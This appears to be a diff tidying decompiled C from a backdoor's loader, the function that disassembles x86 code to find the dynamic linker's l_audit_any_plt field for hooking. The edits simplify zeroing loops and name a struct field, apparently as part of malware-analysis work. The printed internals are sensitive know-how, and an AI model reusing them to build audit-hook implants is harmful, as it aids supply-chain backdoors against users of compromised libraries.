@@ -49,7 +49,7 @@ BOOL find_link_map_l_audit_any_plt
     insn_ctx_wipe_cursor = &insn_ctx;
     for (wipe_idx = 0x16; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
       *(u32 *)&insn_ctx_wipe_cursor->instruction = 0;
-      insn_ctx_wipe_cursor = (dasm_ctx_t *)((long)insn_ctx_wipe_cursor + (ulong)wipe_stride * -8 + 4);
+      insn_ctx_wipe_cursor = (dasm_ctx_t *)((long)insn_ctx_wipe_cursor + 4);
     }
     mask_register_bitmap.raw_value = 0;
     output_register_bitmap.raw_value = 0;
@@ -76,7 +76,7 @@ BOOL find_link_map_l_audit_any_plt
     while ((audit_func_cursor < audit_func_end &&
            (telemetry_ok = x86_dasm(&insn_ctx,(u8 *)audit_func_cursor,(u8 *)audit_func_end),
            decoded_insn_size = insn_ctx.instruction_size, telemetry_ok != FALSE))) {
-      if ((insn_ctx._40_4_ == 0x1036) &&
+      if ((*(u32 *)&insn_ctx.opcode_window[3] == 0x1036) &&
          ((((ushort)insn_ctx.prefix.flags_u32 & 0x140) == 0x140 &&
           ((byte)(insn_ctx.prefix.modrm_bytes.modrm_mod - 1) < 2)))) {
         mask_reg_index = 0;
@@ -118,7 +118,7 @@ BOOL find_link_map_l_audit_any_plt
             // AutoDoc: Zero the `instruction_search_ctx_t` before seeding offsets so the bitmask helper inherits a clean cursor.
             for (wipe_idx = 0x10; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
               *(u32 *)&search_ctx_wipe_cursor->start_addr = 0;
-              search_ctx_wipe_cursor = (instruction_search_ctx_t *)((long)search_ctx_wipe_cursor + (ulong)wipe_stride * -8 + 4);
+              search_ctx_wipe_cursor = (instruction_search_ctx_t *)((long)search_ctx_wipe_cursor + 4);
             }
             // AutoDoc: Whichever register we see first becomes `output_register_to_match`; the companion bitmap is treated as the AND-mask source so they stay paired.
             if (((int)(mask_register_bitmap.raw_value & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0) {
@@ -128,7 +128,7 @@ BOOL find_link_map_l_audit_any_plt
               search_ctx_zero_cursor = &search_ctx.offset_to_match.dwords.reserved;
               for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                 *search_ctx_zero_cursor = 0;
-                search_ctx_zero_cursor = search_ctx_zero_cursor + (ulong)wipe_stride * -2 + 1;
+                search_ctx_zero_cursor = search_ctx_zero_cursor + 1;
               }
               search_ctx.output_register_to_match = &output_register_bitmap;
               search_ctx.output_register = &mask_register_bitmap;
@@ -138,7 +138,7 @@ BOOL find_link_map_l_audit_any_plt
               search_ctx_zero_cursor = &search_ctx.offset_to_match.dwords.reserved;
               for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                 *search_ctx_zero_cursor = 0;
-                search_ctx_zero_cursor = search_ctx_zero_cursor + (ulong)wipe_stride * -2 + 1;
+                search_ctx_zero_cursor = search_ctx_zero_cursor + 1;
               }
               search_ctx.output_register_to_match = &mask_register_bitmap;
               search_ctx.output_register = &output_register_bitmap;
